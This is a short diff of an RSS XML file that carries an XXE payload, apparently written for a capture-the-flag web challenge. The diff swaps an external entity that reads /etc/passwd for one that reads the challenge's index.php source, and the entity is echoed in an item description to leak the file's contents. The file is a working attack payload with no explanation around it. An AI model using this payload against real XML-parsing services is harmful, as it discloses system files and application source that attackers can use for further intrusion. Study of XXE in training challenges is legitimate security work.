@@ -1,5 +1,5 @@
   <!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+  <!ENTITY xxe SYSTEM "file:///challenge/web-serveur/ch29/index.php">
   ]
 >
 <rss version="2.0">
@@ -13,12 +13,7 @@
     <description>&xxe;</description>
   </item>
   <item>
-    <title>XML Tutorial</title>
-    <link>https://www.w3schools.com/xml</link>
-    <description>New XML tutorial on W3Schools</description>
-  </item>
-  <item>
-    <title>passwd test</title>
+    <title>source check</title>
     <link>https://www.w3schools.com/xml</link>
     <description>New XML tutorial on W3Schools</description>
   </item>
